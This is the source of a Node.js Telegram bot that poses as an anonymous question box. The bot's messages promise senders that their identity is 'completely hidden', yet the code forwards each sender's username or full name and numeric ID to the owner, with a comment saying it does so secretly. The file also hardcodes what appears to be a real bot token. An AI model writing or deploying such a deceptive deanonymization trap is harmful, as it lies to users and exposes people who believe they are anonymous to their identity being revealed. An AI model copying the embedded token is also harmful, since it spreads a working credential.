const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = "7828691515:AAGCMKqniiNirDePu7BWiBOj9K_swegkxIE";
const OWNER_ID = 1967979491;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Track users who are in "waiting for question" state
const waitingForQuestion = new Set();

// /start command — triggered when someone opens the shareable link
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  waitingForQuestion.add(chatId);

  bot.sendMessage(
    chatId,
    `🎭 *Ask me anything anonymously!*\n\nYour identity will be completely hidden. Just type your question below and hit send 👇`,
    { parse_mode: "Markdown" }
  );
});

// Handle incoming messages
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Ignore commands
  if (!text || text.startsWith("/")) return;

  // Only process if user is in waiting state
  if (!waitingForQuestion.has(chatId)) {
    bot.sendMessage(
      chatId,
      `👋 Click the link again to send an anonymous question!`
    );
    return;
  }

  // Remove from waiting state
  waitingForQuestion.delete(chatId);

  // Get sender info
  const username = msg.from.username
    ? `@${msg.from.username}`
    : `${msg.from.first_name}${msg.from.last_name ? " " + msg.from.last_name : ""} (ID: ${msg.from.id})`;

  // Send to owner with sender's info (secretly!)
  bot.sendMessage(
    OWNER_ID,
    `❓ *New anonymous question!*\n\n*From:* ${username}\n\n*Question:* ${text}`,
    { parse_mode: "Markdown" }
  );

  // Confirm to sender
  bot.sendMessage(
    chatId,
    `✅ *Your question was sent anonymously!*`,
    { parse_mode: "Markdown" }
  );
});

console.log("🤖 Bot is running...");
